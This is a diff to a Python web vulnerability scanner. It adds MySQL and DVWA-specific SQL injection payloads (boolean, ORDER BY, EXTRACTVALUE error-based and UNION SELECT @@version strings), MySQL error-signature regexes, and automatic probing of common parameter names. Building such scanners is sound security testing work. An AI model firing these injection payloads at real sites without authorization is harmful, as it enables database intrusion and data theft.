@@ -5,7 +5,9 @@ Provides parallel, multithreaded vulnerability scanning with improved detection.
 
 import asyncio
 import aiohttp
-from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
+import warnings
+warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
 from dataclasses import dataclass, field
 from typing import List, Dict, Any, Optional, Set, Callable, Tuple
@@ -170,6 +172,29 @@ class EnhancedScanner:
             "1'",
             "1''",
             '1"',
+            # DVWA / MySQL specific
+            "1'--",
+            "1' --",
+            "1'#",
+            "1' -- -",
+            "1 AND 1=1--",
+            "1 AND 1=2--",
+            "1' AND '1'='1'--",
+            "1' AND '1'='2'--",
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 2--",
+            "1' ORDER BY 3--",
+            "1' GROUP BY 1--",
+            "1' HAVING 1=1--",
+            # Error triggering
+            "1 EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "1' UNION SELECT @@version--",
+            "1' UNION SELECT NULL,@@version--",
+            "1' UNION SELECT NULL,NULL,@@version--",
             "1' OR '1'='1",
             "1' OR '1'='1' --",
             "1' OR '1'='1' /*",
@@ -253,6 +278,14 @@ class EnhancedScanner:
         (r"mysql_fetch", "MySQL"),
         (r"mysql_num_rows", "MySQL"),
         (r"MySQL.*error", "MySQL"),
+        (r"You have an error in your SQL syntax", "MySQL"),
+        (r"supplied argument is not a valid MySQL", "MySQL"),
+        (r"Column count doesn't match", "MySQL"),
+        (r"XPATH syntax error", "MySQL"),
+        (r"Duplicate entry.*for key", "MySQL"),
+        (r"Unknown column", "MySQL"),
+        (r"ORDER BY items must appear", "MySQL"),
+        (r"Table.*doesn't exist", "MySQL"),
         # PostgreSQL errors
         (r"PostgreSQL.*ERROR", "PostgreSQL"),
         (r"Warning.*pg_", "PostgreSQL"),
@@ -709,8 +742,22 @@ class EnhancedScanner:
             except Exception as e:
                 logger.debug(f"Extraction error for {page_url}: {e}")
         
+        # If no query params found on the URL itself, probe it with common SQLi params
+        target_parsed = urlparse(pages[0]) if pages else None
+        if target_parsed and not target_parsed.query:
+            probe_params = ['id', 'user', 'username', 'name', 'category', 'page', 'item', 'product', 'search', 'q', 'query', 'pid', 'uid', 'cid']
+            for param in probe_params:
+                injection_points.append({
+                    'url': pages[0],
+                    'parameter': param,
+                    'location': 'query',
+                    'method': 'GET',
+                    'original_value': '1',
+                    'probed': True
+                })
+
         return injection_points
-    
+
     def _get_common_api_endpoints(self, base_url: str) -> List[Dict[str, Any]]:
         """Generate common API endpoints for SPAs and REST APIs."""
         parsed = urlparse(base_url)
